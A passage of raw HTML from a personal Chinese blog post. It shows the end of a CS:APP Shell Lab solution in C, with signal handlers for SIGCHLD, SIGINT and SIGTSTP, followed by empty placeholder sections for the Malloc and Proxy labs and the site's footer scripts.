class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(verbose)</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: entering&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if fg exists send SIGINT，// 发送SIGINT给前台进程组里的所有进程，包括子进程。</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (sigint) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigint_handler: Job (%d) killed\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if fg exists then send SIGSTP to job</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (tstp) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigstp_handler: Job [%d] (%d) stopped\n&quot;</span>, job-&gt;jid, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h3><p>先占个坑</p>
<h3 id="Proxy-Lab"><a href="#Proxy-Lab" class="headerlink" title="Proxy Lab"></a>Proxy Lab</h3><p>+1</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">0xfocu5</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xfocu5.github.io/posts/ab6e7b0/">https://0xfocu5.github.io/posts/ab6e7b0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0xfocu5.github.io" target="_blank">0xfocu5</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://focu5.oss-accelerate.aliyuncs.com/blog/20200802074734.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2ba75ee3/"><img class="prev-cover" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200927102719.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Fuzz&quot;入门&quot;</div></div></a></div><div class="next-post pull-right"><a href="/posts/17122941/"><img class="next-cover" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200927102719.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">这是一个笔记</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 0xfocu5</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    window.valine = new Valine({
      el: '#vcomment',
      appId: 'P9GVfs1MeERE7LeK2DFsJXmn-gzGzoHsz',
      appKey: 'hzbjuPyWPjwk5HpiLPf3csE9',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
    });
    if ('nick,mail') { valine.config.requiredFields= 'nick,mail'.split(',') }
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/focu5.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="100" mobile="true" src="/js/third-party/canvas-nest.js"></script><script src="/js/third-party/click_heart.js" async="async"></script></div></body></html>